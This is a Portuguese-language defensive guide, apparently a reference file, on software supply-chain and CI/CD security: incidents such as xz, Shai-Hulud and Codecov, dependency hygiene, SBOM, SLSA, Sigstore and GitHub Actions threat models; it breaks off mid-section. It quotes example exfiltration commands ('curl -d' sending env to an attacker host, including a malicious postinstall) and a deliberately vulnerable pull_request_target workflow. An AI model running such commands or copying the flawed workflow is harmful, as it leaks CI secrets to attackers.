# Cadeia de suprimentos e CI/CD

Cobre a superfície de ataque que **não está no código que você escreveu**: dependências de terceiros,
o registro de onde elas vêm, o pipeline que compila e publica, o artefato resultante, o container que
o executa e a infraestrutura declarada em IaC. Abra este arquivo quando o pedido envolver
`.github/workflows/*.yml`, `Dockerfile`, `package.json`/lockfile, `*.tf`, manifests Kubernetes,
publicação de pacote, ou quando a pergunta for "essa dependência é segura?" / "como endureço meu
pipeline?".

Na edição vigente do OWASP Top 10, este assunto tem categoria própria:
**[A03:2025 – Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)**.
É a categoria com **maior taxa média de incidência do Top 10 (5,72%)**, com 215.248 ocorrências nos
dados analisados, e foi a **#1 na pesquisa com a comunidade, escolhida por exatos 50% dos
respondentes** — a primeira vez que uma categoria domina simultaneamente os dados e a percepção. Ela
absorveu e ampliou a antiga A06:2021 (Vulnerable and Outdated Components), que tratava só de
"componente com CVE"; a de 2025 inclui o processo de build, distribuição e atualização.

Vizinhos (não duplicar): `threat-modeling-e-severidade.md` para priorização e CVSS;
`criptografia-e-segredos.md` para gestão e rotação de segredo; `ssrf-e-camada-http.md` para IMDS e
metadata service; `llm-e-ia.md` para pacote alucinado; `ferramentas.md` para a linha de comando exata
de cada scanner; `revisao-de-codigo.md` para o fluxo geral de revisão.

## Índice

- [Por que essa classe explodiu](#por-que-essa-classe-explodiu)
- [Incidentes que definem a classe](#incidentes-que-definem-a-classe)
- [Taxonomia dos ataques a dependências](#taxonomia-dos-ataques-a-dependências)
- [Higiene de dependência que funciona](#higiene-de-dependência-que-funciona)
- [Responder a alerta de vulnerabilidade sem virar refém](#responder-a-alerta-de-vulnerabilidade-sem-virar-refém)
- [SBOM e proveniência](#sbom-e-proveniência)
- [GitHub Actions: o modelo de ameaça](#github-actions-o-modelo-de-ameaça)
- [GitLab CI, Jenkins e Azure Pipelines](#gitlab-ci-jenkins-e-azure-pipelines)
- [OWASP Top 10 CI/CD Security Risks](#owasp-top-10-cicd-security-risks)
- [Registro e artefato](#registro-e-artefato)
- [Container e runtime](#container-e-runtime)
- [Kubernetes](#kubernetes)
- [IaC e cloud](#iac-e-cloud)
- [Checklist: endurecer o pipeline deste repositório](#checklist-endurecer-o-pipeline-deste-repositório)
- [Sinais em revisão](#sinais-em-revisão)
- [Falsos positivos comuns](#falsos-positivos-comuns)
- [Fontes](#fontes)

## Por que essa classe explodiu

O raciocínio econômico do atacante mudou. Atacar uma aplicação rende uma aplicação. Atacar quem a
constrói rende todas as aplicações construídas com aquele componente — e rende **com privilégio de
build**, que costuma ser maior que o privilégio de runtime.

Três assimetrias sustentam isso:

1. **Multiplicador de alcance.** `debug` e `chalk`, comprometidos em 8 de setembro de 2025,
   somavam mais de **2 bilhões de downloads semanais** entre os 18 pacotes afetados. Um único
   token de publicação roubado alcança um número de máquinas que nenhuma campanha de phishing
   direta alcançaria.
2. **Confiança transitiva não auditada.** Um projeto Node de porte médio instala 800–1500 pacotes.
   O desenvolvedor escolheu 20. Os outros 1400 entraram porque alguém que ele escolheu escolheu
   outra pessoa. A superfície de decisão é 1,5% da superfície de execução.
3. **O pipeline tem os segredos e ninguém o revisa.** O runner de CI tem token do registro, chave
   de deploy, credencial de cloud e acesso de escrita ao repositório. E o arquivo que define o que
   ele roda (`.github/workflows/ci.yml`) normalmente passa por revisão muito mais frouxa que
   `src/auth/session.ts`, quando passa.

Some a isso que o código do build roda **sem sandbox e sem revisão**: `npm install` executa
`postinstall` de qualquer pacote da árvore como o usuário do runner, antes de qualquer teste,
linter ou revisor ver qualquer coisa.

## Incidentes que definem a classe

Ordenados por quanto ensinam, não por manchete.

| Incidente | Ecossistema | Data | Vetor | A lição em uma frase |
|---|---|---|---|---|
| [SolarWinds Orion](https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a) | Build .NET corporativo | dez/2020 (implante desde 2019) | Backdoor injetado no **processo de build** do fornecedor, assinado com o certificado legítimo | Assinatura de código só prova quem compilou, não que o que foi compilado é o que estava no repositório. |
| [`event-stream` / `flatmap-stream`](https://github.com/dominictarr/event-stream/issues/116) | npm | nov/2018 | Mantenedor cansado **transferiu ownership** a um voluntário desconhecido, que adicionou dependência maliciosa mirando a carteira Copay | Transferência de manutenção é uma mudança de fronteira de confiança e ninguém é notificado dela. |
| [Codecov Bash Uploader](https://about.codecov.io/security-update/) | CI (script bash) | 31/jan a 01/abr/2021 | Credencial vazada no **processo de criação da imagem Docker** permitiu alterar o script servido; o script passou a fazer `curl -d "$(git remote -v)<<<<<< ENV $(env)"` para IPs do atacante | `curl \| bash` em CI exfiltra todo o `env` do runner; verifique checksum ou não faça. |
| [`ua-parser-js`](https://github.com/faisalman/ua-parser-js/issues/536) | npm | out/2021 | Conta do mantenedor comprometida; versões 0.7.29 / 0.8.0 / 1.0.0 com `preinstall` instalando cryptominer e infostealer | Pacote de 8 milhões de downloads/semana pode ficar malicioso por horas sem ninguém notar. |
| [Log4Shell / CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) | Java / Maven | dez/2021 | Não foi ataque à cadeia: foi uma vulnerabilidade num componente ubíquo. O caos veio de **ninguém saber onde o Log4j estava** | O valor de um SBOM se mede em quantas horas ele economiza no dia do próximo Log4Shell. |
| [PyTorch `torchtriton`](https://pytorch.org/blog/compromised-nightly-dependency/) | PyPI | 25–30/dez/2022 | Dependency confusion: pacote homônimo no PyPI público venceu o índice nightly do PyTorch; binário exfiltrava `/etc/passwd`, `~/.ssh/*`, `~/.gitconfig`, env e os 1000 primeiros arquivos de `$HOME` por DNS para `*.h4ck[.]cfd` | `--extra-index-url` não é "índice extra": é "índice concorrente, e o maior número de versão ganha". |
| [`node-ipc` (protestware)](https://github.com/RIAEvangelist/node-ipc) | npm | mar/2022 | Mantenedor publicou versões que **sobrescreviam arquivos com ❤️** em máquinas com IP na Rússia/Bielorrússia (`peacenotwar`) | O modelo de ameaça inclui o mantenedor legítimo mudando de ideia; range semver `^` entrega isso automaticamente. |
| [`xz` / liblzma — CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094) | Linux / C (tarball) | 29/mar/2024, CVSS **10.0** | Ver abaixo | O repositório Git estava limpo. O **tarball de release** não estava. |
| [npm `chalk`/`debug` (qix)](https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised) | npm | 08/set/2025, 13:16 UTC | Phishing com domínio `support@npmjs.help` registrado 3 dias antes; 18 pacotes, >2B downloads/semana; payload era um *clipper* de cripto no browser que hookava `window.ethereum`, `fetch` e `XMLHttpRequest` e trocava endereços de carteira | 2FA por TOTP não sobrevive a um proxy de phishing; só WebAuthn/FIDO sobrevive. |
| [Shai-Hulud (worm npm)](https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack) | npm | 15/set/2025; segunda onda "2.0" em nov/2025 | Ver abaixo | O primeiro worm de **autopropagação** em npm: o pacote comprometido publica pacotes comprometidos. |
| Bybit | Software de carteira | fev/2025 | Software de carteira alterado disparando sob condições específicas; **US$ 1,5 bilhão** | Citado pelo próprio A03:2025 como cenário; o alvo do supply chain é a transação, não o servidor. |

### O caso `xz`: o mais instrutivo de todos

Vale detalhar porque quase nenhum controle técnico usual teria pego.

O atacante ("Jia Tan") passou **cerca de dois anos** contribuindo com código legítimo para o projeto
`xz`, ganhando confiança do mantenedor original — que estava sobrecarregado e sofrendo pressão
pública de contas coordenadas exigindo que ele passasse a manutenção adiante. Foi um ataque de
engenharia social contra um humano exausto, executado com paciência.

O payload técnico:

- O **repositório Git estava limpo**. O código malicioso vivia nos **tarballs de release** 5.6.0 e
  5.6.1, gerados manualmente pelo mantenedor comprometido.
- O objeto malicioso estava escondido dentro de arquivos de **teste** binários (`tests/files/bad-3-corrupt_lzma2.xz`),
  que ninguém revisa porque são intencionalmente lixo.
- Um `m4/build-to-host.m4` alterado, presente só no tarball, extraía e ligava o objeto durante o
  `./configure`, substituindo funções do liblzma. O alvo final era `RSA_public_decrypt` no OpenSSH
  ligado ao systemd via liblzma: um backdoor de pré-autenticação em SSH.
- Foi descoberto por acaso, por um engenheiro da Microsoft investigando **500 ms de latência** a mais
  em logins SSH e uso anômalo de CPU.

Três conclusões operacionais:

1. **Auditar o repositório não audita o que você instala.** Se seu pacote vem de tarball/binário,
   a única defesa é build reproduzível a partir da fonte ou proveniência assinada que ligue o
   artefato ao commit.
2. **Arquivo de teste binário é um esconderijo de primeira.** Em revisão, `.bin`/`.xz`/`.png` novo
   em `test/fixtures/` acompanhado de mudança no build script é sinal.
3. **Mantenedor único e sobrecarregado é um risco de segurança mensurável.** Entra no critério de
   adoção de dependência.

### O caso Shai-Hulud: o worm

Mecânica, porque ela define o padrão que veremos repetido:

1. `postinstall` do pacote comprometido baixa e roda **TruffleHog** para varrer o disco e o `env`
   atrás de segredos; também consulta o IMDS da cloud quando disponível.
2. Achando token do GitHub: cria um repositório **público** chamado `Shai-Hulud` com os segredos
   coletados, planta um workflow do GitHub Actions que exfiltra segredos do repositório para um
   endpoint `webhook.site`, e torna repositórios privados da organização públicos com sufixo
   `-migration`.
3. Achando **token npm**: publica versões maliciosas de todos os pacotes ao alcance daquele token —
   é o passo de autopropagação. Mais de 500 versões de pacote foram afetadas.

A resposta do GitHub foi mudar o registro npm: remoção de 500+ pacotes, bloqueio de upload com IoCs
conhecidos, e o [plano anunciado em 22/set/2025](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/)
de reduzir as opções de publicação a **três**: publicação local com 2FA obrigatório, **granular
tokens com vida limitada a 7 dias**, e **trusted publishing** via OIDC. Classic tokens serão
descontinuados, TOTP dá lugar a FIDO, e a opção de bypass de 2FA na publicação local some.

## Taxonomia dos ataques a dependências

| Técnica | Mecanismo | Detecção / defesa |
|---|---|---|
| **Typosquatting** | `expres`, `loadash`, `python-dateutil` → `dateutil` | Lint de nome no lockfile; distância de Levenshtein contra top-N pacotes; allowlist |
| **Combosquatting** | `node-fetch-api`, `react-router-dom-v6` — nome plausível, não errado | Só revisão humana ou allowlist pega |
| **Dependency confusion** | ver abaixo | Escopo privado + registry por escopo |
| **Conta de mantenedor comprometida** | Phishing (qix), reuso de senha, token vazado em repositório | `minimumReleaseAge`, monitoramento de nova versão, provenance |
| **`postinstall` malicioso** | Script de ciclo de vida roda como o usuário, sem sandbox, antes de qualquer teste | `ignore-scripts` por padrão |
| **Pacote abandonado transferido** | `event-stream` | Sinal: novo publisher para pacote antigo (`npm view <pkg> maintainers`) |
| **Protestware** | `node-ipc`, `colors`/`faker` (infinite loop, jan/2022) | Pinning exato + cooldown |
| **Starjacking** | O registro exibe as estrelas do repositório declarado em `repository.url`, sem verificar que o pacote saiu dele — pacote malicioso "herda" a reputação de um projeto popular | Confira o link `repository` de verdade; provenance resolve na raiz |
| **Slopsquatting / pacote alucinado por LLM** | O modelo sugere `import` de um pacote que não existe; o atacante registra o nome | Nunca instale nome sugerido sem conferir no registro. Veja `references/llm-e-ia.md` |
| **Backdoor no build, não na fonte** | `xz`; SolarWinds | Build reproduzível; proveniência SLSA ligando artefato ↔ commit |
| **Install-time vs runtime** | O malware roda no `install`, mesmo que o pacote nunca seja `import`ado | `--ignore-scripts` é a única defesa real |

### Dependency confusion, em detalhe

O mecanismo é de **resolução de nome**, não de vulnerabilidade de código.

Quando um cliente de pacote está configurado com registro privado *mais* registro público
(`--extra-index-url` no pip, `registry` global + feed interno no npm, repositório virtual no
Artifactory), a maioria das implementações históricas resolvia consultando **os dois** e escolhendo
a **maior versão**. O nome `@empresa-interna/billing-utils` sem escopo — só `billing-utils` — existe
no seu feed privado em `1.4.2`. O atacante publica `billing-utils@9000.0.0` no npm público. Na
próxima instalação, o público vence.

Como o atacante descobre os nomes internos: `package.json` vazado em bundle de JavaScript servido ao
browser, repositório público da empresa com um `package-lock.json` esquecido, imagens Docker
públicas, e nomes em stack traces. [Alex Birsan](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
atingiu **35+ organizações** (Apple, Microsoft, PayPal, Netflix, Uber, Shopify, Yelp) com bounties
de US$ 30k–40k por alvo.

Defesa, em ordem de eficácia:

```ini
# .npmrc — a defesa real: escopo privado + registry POR ESCOPO
@minhaempresa:registry=https://npm.pkg.github.com/
//npm.pkg.github.com/:_authToken=${NPM_TOKEN}
registry=https://registry.npmjs.org/
```

Com escopo, `@minhaempresa/qualquer-coisa` só é buscado no registro daquele escopo — não há
concorrência de versão possível, porque o atacante não consegue publicar dentro do seu escopo no
npm público (escopos de organização são reservados).

Complementos:
- **Registre defensivamente** no registro público os nomes sem escopo que você já usa internamente
  (o PyTorch fez isso com `torchtriton` depois do incidente).
- Rode uma verificação em CI: para cada dependência interna do lockfile, `npm view <nome>` no
  público; se existir, alarme.
- No pip, troque `--extra-index-url` por `--index-url` apontando para um proxy que faz a decisão
  explicitamente, e use `--require-hashes`.

## Higiene de dependência que funciona

### Lockfile: o que garante e o que não garante

**Garante**: a árvore resolvida exata (nome + versão + URL) e, via campo `integrity`
(`sha512-...`, Subresource Integrity), que o **tarball baixado é byte a byte o mesmo** que foi
resolvido na primeira vez. Um mirror comprometido que sirva um tarball diferente falha o install.

**Não garante**:
- Que o conteúdo daquele tarball seja benigno. `ua-parser-js@0.7.29` malicioso tem um `integrity`
  perfeitamente válido.
- Que scripts não rodem. `integrity` não impede `postinstall`.
- Nada, se você rodar `npm install` em vez de `npm ci` — `npm install` **pode reescrever o
  lockfile** silenciosamente para satisfazer um range em `package.json`.
- Que `resolved` aponte para o registro que você espera: um lockfile envenenado em um PR pode
  apontar `resolved` para um host arbitrário com `integrity` casando. **Faça diff do lockfile na
  revisão de PR** — mudança de `resolved` para host não-usual é achado grave.

| Comando | Lê lockfile | Escreve lockfile | Falha se lock ≠ package.json | Apaga `node_modules` |
|---|---|---|---|---|
| `npm install` | sim | **sim** | não (ajusta) | não |
| `npm ci` | sim | não | **sim (exit 1)** | sim |

Em CI, **sempre `npm ci`** (`pnpm install --frozen-lockfile`, `yarn install --immutable`).

### Scripts de ciclo de vida

O default de `npm install` é executar `preinstall`/`install`/`postinstall` de **toda a árvore**. É o
vetor de entrega da maioria dos incidentes acima.

```ini
# .npmrc no repositório
ignore-scripts=true
```

Como conviver: alguns pacotes realmente precisam do script (`esbuild`, `sharp`, `better-sqlite3`,
`@prisma/client`, `puppeteer`, `cypress`). O padrão é allowlist explícita:

```yaml
# pnpm-workspace.yaml (pnpm 10+: scripts de dependência são bloqueados por padrão)
onlyBuiltDependencies:
  - esbuild
  - '@prisma/client'
```

```yaml
# .yarnrc.yml — no Yarn 4 moderno o default de enableScripts já é false
enableScripts: false
```

Com `ignore-scripts=true` no npm, o padrão de convivência é rodar o build necessário
explicitamente por pacote (`npm rebuild esbuild`) ou usar pnpm/Yarn, que têm a allowlist nativa.

### Quarentena de versão nova (cooldown)

Praticamente todo pacote comprometido foi detectado e despublicado em **horas**. Se você não instala
uma versão publicada há menos de um dia, você não é atingido — pelo custo de ficar um dia atrasado.

| Gerenciador | Configuração | Default |
|---|---|---|
| **pnpm** | `minimumReleaseAge: <minutos>` + `minimumReleaseAgeExclude: [...]` (adicionados em **v10.16.0**; padrões glob em v10.17.0; versões específicas em v10.19.0) | **1440 (24 h) a partir do pnpm v11**; 0 antes |
| **Yarn** | `npmMinimalAgeGate` + `npmPreapprovedPackages` (desde v4.15.0) | **`1d`** |
| **npm** | `min-release-age: <dias>` (desde **11.10.0**) + `min-release-age-exclude` (desde **12.0.0**). O antigo truque `npm install --before=<data>` continua valendo, mas é global e manual | 0 |

```yaml
# pnpm-workspace.yaml
minimumReleaseAge: 1440
minimumReleaseAgeExclude:
  - '@minhaempresa/*'          # pacotes internos publicam e consomem no mesmo dia
  - 'react@19.2.0'             # exceção pontual para uma versão específica
```

Combine com **Dependabot/Renovate configurado para abrir PR com atraso** (Renovate:
`minimumReleaseAge: "3 days"`) em vez de mergear na hora.

### Pinning: exato vs range

`^4.17.21` significa "aceito qualquer 4.x ≥ 4.17.21 que o mantenedor publicar". O lockfile congela a
resolução, então em CI com `npm ci` o range não te machuca. Ele machuca quando:

- alguém roda `npm install` sem lock (Dockerfile mal escrito, `npm i` local);
- há regeneração de lock (bump de qualquer coisa reresolve a árvore);
- a dependência é publicada como biblioteca — aí seus ranges viram os ranges do consumidor.

Regra prática: **aplicação** → lockfile commitado é suficiente, ranges `^` são aceitáveis;
**biblioteca publicada** → ranges o mais amplos que sejam corretos, porque pin exato em lib gera
duplicação de árvore no consumidor; **dependência de altíssimo risco** (qualquer coisa que toque
credencial, cripto ou rede no build) → versão exata.

### Critérios para adotar uma dependência

Antes da ferramenta, a pergunta: **"eu preciso mesmo disso?"** É a única que reduz a superfície de
ataque em vez de administrá-la. `left-pad` (11 linhas) quebrou meia internet em 2016 ao ser
despublicado; `is-odd` depende de `is-number` para fazer `n % 2`. Em 2026, `String.prototype.padStart`,
`structuredClone`, `crypto.randomUUID`, `Array.prototype.at`, `Object.groupBy` e `fetch` são
nativos no Node 24 — muita dependência de utilidade é dívida pura.

Quando precisar mesmo, avalie:

| Sinal | Verificação | Limiar de alerta |
|---|---|---|
| Tamanho da árvore transitiva | `npm ls --all \| wc -l`, ou `npx howfat <pkg>` | Um logger que traz 40 pacotes é um problema |
| Número de mantenedores | `npm view <pkg> maintainers` | 1 mantenedor + alto download = risco de `event-stream` |
| Idade da última publicação | `npm view <pkg> time.modified` | Abandonado (>2 anos) sem fork ativo |
| Publicação recente anômala | `npm view <pkg> time` | Pacote parado por 3 anos que publica hoje |
| Tem `postinstall`? | `npm view <pkg> scripts` | Justificativa obrigatória se sim |
| Tem provenance? | `npm view <pkg> dist.attestations` / badge no site | Ausência não condena, presença ajuda muito |
| Repositório real? | Abrir o `repository.url` | Starjacking mora aqui |

Ferramentas que olham **comportamento** e não CVE (Socket, `osv-scanner`, `npq`) são muito mais
úteis contra ataque de supply chain do que `npm audit` — elas alertam para "esta versão adicionou um
`postinstall`", "esta versão passou a fazer requisição de rede", "esta versão passou a ler o
filesystem". Comandos exatos em `references/ferramentas.md`.

## Responder a alerta de vulnerabilidade sem virar refém

`npm audit` num projeto Next.js típico devolve dezenas de alertas, quase todos em `devDependencies`,
quase todos irrelevantes. Tratar todos como bug queima o time e ensina a ignorar o scanner — que é
exatamente o estado em que o alerta que importava passa batido.

Três filtros, nesta ordem:

**1. Alcançabilidade.** A função vulnerável é chamada pelo seu código, com entrada que o atacante
controla, em um processo exposto?

- ReDoS numa regex de um plugin de ESLint: roda só no seu laptop e no CI, com entrada que é o seu
  próprio código. **Não é acionável.**
- Prototype pollution numa lib de merge usada no parsing do body de uma rota pública: **acionável
  agora.**
- Vulnerabilidade em um caminho de código que sua versão nem importa (ex.: o driver MySQL de um ORM
  que você usa só com Postgres): não acionável.

`npm audit --omit=dev` já elimina a maior parte do ruído. `osv-scanner` tem análise de chamadas
(`--call-analysis`) para algumas linguagens.

**2. Exploração real: KEV e EPSS.**

- **[CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)** — catálogo de CVEs
  com exploração ativa **confirmada**. Se está no KEV e você é afetado, corrija hoje. Sem discussão,
  sem análise de alcançabilidade primeiro.
- **[EPSS](https://www.first.org/epss/)** — probabilidade (0–1) de exploração nos próximos 30 dias.
  Serve para ordenar o resto. EPSS > 0,1 já coloca a CVE no percentil alto; a mediana das CVEs fica
  abaixo de 0,01.
- **CVSS não é prioridade.** CVSS é severidade *se* explorada, calculada pelo emissor sem saber nada
  do seu ambiente. Um CVSS 9.8 em componente inalcançável é menos urgente que um 6.5 no KEV.
  Detalhe em `references/threat-modeling-e-severidade.md`.

**3. Custo da correção.** `npm audit fix --force` faz bump de major e quebra o build. Se o único fix
é um major com breaking change num pacote inalcançável, a resposta correta é registrar a decisão
(um `.nsprc`, um `audit-ci` com allowlist datada, um comentário no ticket) e revisitar — não travar
a release.

O que **não** é aceitável adiar: dependência com **código malicioso** (não é CVE, é `GHSA` de
malware) — remoção imediata, mais **rotação de todo segredo que o processo de build teve acesso**,
porque o modelo é "assuma exfiltração".

## SBOM e proveniência

### CycloneDX vs SPDX

| | **CycloneDX** | **SPDX** |
|---|---|---|
| Origem/padrão | OWASP; ECMA-424 | Linux Foundation; **ISO/IEC 5962** |
| Vocação | Segurança e análise de risco em tempo de execução | Licenciamento e compliance jurídica |
| Suporta | VEX nativo, SaaSBOM, ML-BOM, dependências de serviço | Relacionamentos ricos entre arquivos e pacotes, licenças detalhadas |
| Formatos | JSON, XML, Protobuf | JSON, YAML, RDF, tag-value |
| Use quando | O consumidor é seu scanner e seu time de segurança | O consumidor é um cliente enterprise, um órgão público, ou o jurídico |

Na prática: **gere CycloneDX** para uso interno e **SPDX** quando um contrato exigir. `syft` gera os
dois a partir de imagem ou diretório.

### O SBOM que ninguém usa

A maioria das organizações gera SBOM, arquiva e nunca abre. O SBOM só paga o custo se estiver
**consultável**. O teste de valor é o cenário Log4Shell: às 3h da manhã, quando o mundo descobre que
`log4j-core < 2.17.1` é RCE, quanto tempo você leva para responder "quais dos nossos 60 serviços em
produção contêm isso, em qual versão, e desde qual deploy"?

Para isso o SBOM precisa:

1. Ser gerado **da imagem final publicada**, não do `package.json` — o que importa é o que está no
   artefato que roda, incluindo pacotes do SO da imagem base.
2. Ser **anexado ao artefato** (attestation OCI) ou indexado por digest de imagem, para casar
   "imagem em produção" ↔ "SBOM".
3. Ser ingerido em algo consultável — [Dependency-Track](https://dependencytrack.org/) é o padrão de
   fato: você joga o SBOM lá, ele correlaciona continuamente com NVD/OSV/GitHub Advisories e te
   avisa quando uma CVE nova atinge um componente que você já publicou. É a diferença entre "eu tenho
   um SBOM" e "eu sei o que rodo".

### SLSA

[SLSA](https://slsa.dev/) (Supply-chain Levels for Software Artifacts) está na **versão 1.2** da
especificação. A track de Build tem quatro níveis:

| Nível | Garantia | O que exige na prática |
|---|---|---|
| **Build L0** | Nenhuma | Build local, sem proveniência |
| **Build L1** | *Proveniência existe* — mostra como foi construído, mas é trivial forjar | Build por processo consistente + proveniência gerada automaticamente |
| **Build L2** | *Plataforma de build hospedada* — a plataforma gera e **assina** a proveniência | CI hospedado (GitHub Actions, GitLab), assinatura da plataforma. Impede adulteração **depois** do build |
| **Build L3** | *Build endurecido* — isolamento entre execuções e proteção da chave de assinatura | Runner efêmero, segredo de assinatura inacessível ao código do build. Impede adulteração **durante** o build |

Não há Build L4 na especificação atual. Um workflow no GitHub Actions usando
`actions/attest-build-provenance` em runner hospedado atinge **L3** para a maioria das definições —
esse é o ponto: L3 ficou acessível para qualquer repositório, sem infraestrutura própria.

### in-toto, Sigstore, cosign

**in-toto attestation** é o formato do envelope: um documento assinado que diz *predicate* (o quê:
proveniência, SBOM, resultado de scan, revisão de código) sobre um *subject* (o artefato, por
digest). SLSA Provenance é um tipo de predicate in-toto. É por isso que "attestation" aparece como
guarda-chuva: proveniência é uma attestation entre várias.

**Sigstore** resolve o problema que matou a assinatura de código por 20 anos: gerenciar chave
privada. No modo **keyless**:

1. O signatário se autentica via OIDC (no CI: o token de identidade do workflow).
2. **Fulcio** (a CA) emite um certificado X.509 **de vida curta (10 minutos)** contendo a identidade
   do OIDC como SAN.
3. A assinatura é feita com a chave efêmera e o registro vai para o **Rekor**, um log de
   transparência append-only.
4. A chave privada é descartada. Não há chave para vazar, para rotacionar ou para roubar.

Verificação com `cosign` — **os dois flags são obrigatórios e é aqui que se erra**:

```bash
# ❌ inútil: verifica que ALGUÉM assinou, não quem
cosign verify ghcr.io/org/app@sha256:abc...

# ✅ verifica identidade E emissor
cosign verify ghcr.io/org/app@sha256:abc... \
  --certificate-identity="https://github.com/org/app/.github/workflows/release.yml@refs/heads/main" \
  --certificate-oidc-issuer="https://token.actions.githubusercontent.com"
```

Sem `--certificate-identity` + `--certificate-oidc-issuer`, qualquer pessoa com uma conta Google
pode produzir uma assinatura válida do Sigstore para a sua imagem. Aceitar "está assinado" sem
checar **quem** assinou é o erro mais comum de adoção do cosign. Prefira
`--certificate-identity-regexp` quando precisar cobrir várias branches, nunca `.*`.

### npm provenance e trusted publishing

```yaml
# .github/workflows/release.yml
permissions:
  contents: read
  id-token: write          # obrigatório: mint do token OIDC
steps:
  - uses: actions/checkout@<sha>
  - uses: actions/setup-node@<sha>
    with:
      node-version: 24
      registry-url: 'https://registry.npmjs.org'
  - run: npm ci
  - run: npm publish --provenance --access public
```

Requisitos: npm CLI ≥ 9.5.0, `repository.url` no `package.json` casando (case-sensitive) com o
repositório real, runner hospedado na nuvem, e GitHub Actions ou GitLab CI/CD. O resultado é uma
attestation no Rekor ligando o tarball ao commit e ao workflow — é isso que derruba starjacking e
permite auditar "esse tarball saiu mesmo daquele código?".

Do lado do consumidor: `npm audit signatures` verifica assinaturas de registro e attestations da
árvore instalada. Rode em CI.

**Trusted publishing** (npm CLI ≥ 11.5.1, Node ≥ 22.14.0) vai além: elimina o token npm por
completo. Você registra no npmjs.com que o pacote X só pode ser publicado pelo workflow
`release.yml` do repositório `org/repo`; o publish autentica por OIDC (`id-token: write`), sem
segredo nenhum no repositório. Suportado em GitHub Actions, GitLab CI/CD e CircleCI, **apenas em
runners hospedados**. É a mitigação estrutural para o caso `qix`: token roubado por phishing deixa
de ser suficiente para publicar.

### GitHub artifact attestations

```yaml
permissions:
  id-token: write
  contents: read
  attestations: write
  packages: write            # para imagem de container
steps:
  - uses: actions/attest-build-provenance@<sha>
    with:
      subject-name: ghcr.io/${{ github.repository }}
      subject-digest: ${{ steps.push.outputs.digest }}
      push-to-registry: true
```

Verificação: `gh attestation verify oci://ghcr.io/org/app:1.2.3 -R org/app`. Para binário:
`gh attestation verify ./dist/app -R org/app`. Para SBOM, use
`actions/attest-sbom` e verifique com `--predicate-type`.

### Builds reproduzíveis

O que dá para conseguir: mesmo commit + mesma toolchain fixada + `SOURCE_DATE_EPOCH` → mesmo digest.
Em Go é quase trivial (`-trimpath`, `-buildvcs=false`, `CGO_ENABLED=0`). Em imagens Docker,
`buildkit` com `--output type=image,rewrite-timestamp=true` e base pinada por digest chega perto.

O que não dá: qualquer coisa que embuta timestamp de build, hostname, path absoluto, ordem de
iteração de map, ou baixe da rede sem pin. Em Node, `node_modules` reproduzível exige `npm ci` +
lockfile + Node pinado por versão exata, e mesmo assim binários nativos compilados variam.

Conclusão prática: **build reproduzível é caro e raramente é o próximo controle de maior retorno.**
Proveniência assinada (SLSA L2/L3) entrega 80% do benefício — "este binário saiu deste commit por
este workflow" — a 5% do custo. Persiga reprodutibilidade só se você distribui binário para
terceiros que precisam verificar sem confiar no seu CI.

## GitHub Actions: o modelo de ameaça

A pergunta que organiza tudo: **este job executa código que um estranho pode influenciar, tendo
acesso a segredo ou a escrita no repositório?** Se sim, existe um caminho de RCE.

### `pull_request_target` e o padrão de RCE

A diferença entre os dois gatilhos é toda a história:

| | `pull_request` | `pull_request_target` |
|---|---|---|
| De qual ref vem o arquivo de workflow | Do merge do PR (**o atacante controla**) | Da **branch base** (você controla) |
| Segredos disponíveis | **Não**, em PR de fork | **Sim** |
| `GITHUB_TOKEN` | Read-only em fork | **Read-write** |
| `github.ref` / checkout padrão | Merge ref do PR | **Branch base** |

`pull_request_target` foi criado exatamente para o caso "preciso de segredo/escrita ao reagir a um
PR de fork" (rotular, comentar, atualizar status). Ele é seguro **por construção**, desde que você
não traga o código do PR para dentro dele. O bug clássico:

```yaml
# ❌ RCE. Código de qualquer estranho rodando com os segredos do repositório.
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # <- código não confiável
      - run: npm ci && npm test                            # <- postinstall do atacante roda aqui
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

Nem precisa de `npm test` malicioso: basta o atacante alterar `package.json` no PR adicionando um
`"postinstall": "curl -d @<(env) https://attacker/"`. Ou alterar o lockfile apontando para um pacote
seu. Ou alterar qualquer arquivo de configuração que uma ferramenta do build executa
(`.eslintrc.js`, `jest.config.js`, `next.config.js`, `Makefile`, `gradle.properties`). A superfície
é enorme — **qualquer** execução sobre o código do PR conta.

O padrão seguro é **separar em dois workflows** por confiança:

```yaml
# 1) .github/workflows/pr-build.yml — NÃO confiável, SEM segredos
on: pull_request
permissions: {}                       # nada. nem contents.
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with: { persist-credentials: false }
      - run: npm ci && npm test -- --reporter=json --outputFile=result.json
      - run: echo "${{ github.event.number }}" > pr-number.txt
      - uses: actions/upload-artifact@<sha>
        with: { name: test-result, path: |
            result.json
            pr-number.txt }
```

```yaml
# 2) .github/workflows/pr-comment.yml — confiável, COM segredos, NÃO executa nada do PR
on:
  workflow_run:
    workflows: ["pr-build"]
    types: [completed]
permissions:
  pull-requests: write
jobs:
  comment:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with:
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
          name: test-result
      # o conteúdo do artefato é DADO, nunca comando. Trate como entrada hostil.
      - uses: actions/github-script@<sha>
        with:
          script: |
            const fs = require('fs')
            const n = parseInt(fs.readFileSync('pr-number.txt','utf8').trim(), 10)
            if (!Number.isInteger(n)) throw new Error('pr number inválido')
            const body = JSON.parse(fs.readFileSync('result.json','utf8'))
            await github.rest.issues.createComment({
              ...context.repo, issue_number: n,
              body: '```\n' + String(body.summary).slice(0, 60000) + '\n```'
            })
```

Regras do padrão: o job confiável (a) nunca faz checkout do head do PR, (b) trata o artefato como
